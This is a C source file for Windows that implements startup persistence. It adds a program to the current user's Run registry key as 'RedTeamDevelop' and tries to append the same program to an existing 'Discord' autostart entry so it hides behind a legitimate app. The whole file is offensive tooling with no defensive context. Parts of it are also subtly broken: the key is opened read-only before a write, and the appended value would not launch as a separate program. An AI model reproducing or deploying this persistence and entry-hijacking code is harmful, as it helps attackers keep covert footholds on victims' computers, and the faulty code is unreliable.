#include <windows.h>
#include <stdio.h>

void addToStartup(const char *keyName, const char *executablePath) {
    HKEY hKey;
    LONG result;

    // Open the registry key for writing
    result = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);

    if (result == ERROR_SUCCESS) {
        // Set the registry value to run the program on startup
        result = RegSetValueEx(hKey, keyName, 0, REG_SZ, (BYTE*)executablePath, (DWORD)(strlen(executablePath) + 1));
        RegCloseKey(hKey);

        if (result == ERROR_SUCCESS) {
            printf("Added to startup: %s\n", executablePath);
        } else {
            printf("Failed to add to startup\n");
        }
    } else {
        printf("Failed to open registry key\n");
    }
}

void addToAnotherStartup(const char *keyName, const char *executablePath) {
    HKEY hKey;
    LONG result;
    DWORD dataSize = 0;
    char *existingValue = NULL;

    // Open the registry key for reading and get the existing value
    result = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey);

    if (result == ERROR_SUCCESS) {
        // Determine the size of the existing registry value
        result = RegQueryValueEx(hKey, keyName, 0, NULL, NULL, &dataSize);
        
        if (result == ERROR_SUCCESS) {
            // Allocate memory for the existing registry value
            existingValue = (char*)malloc(dataSize);

            // Read the existing registry value
            result = RegQueryValueEx(hKey, keyName, 0, NULL, (BYTE*)existingValue, &dataSize);

            if (result == ERROR_SUCCESS) {
                // Append the new executable path to the existing value
                char newValue[MAX_PATH];
                snprintf(newValue, sizeof(newValue), "%s %s", existingValue, executablePath);

                // Set the updated registry value
                result = RegSetValueEx(hKey, keyName, 0, REG_SZ, (BYTE*)newValue, (DWORD)(strlen(newValue) + 1));
                if (result == ERROR_SUCCESS) {
                    printf("Added to startup: %s\n", executablePath);
                } else {
                    printf("Failed to add to startup\n");
                }
            }
        }

        free(existingValue);
        RegCloseKey(hKey);
    }
}

int main() {
    const char *keyName = "RedTeamDevelop";
    const char *otherKeyName = "Discord";
    const char *executablePath = "C:\\path\\to\\your\\program.exe"; // Specify the path to your program

    addToStartup(keyName, executablePath);
    addToAnotherStartup(otherKeyName, executablePath);

    return 0;
}
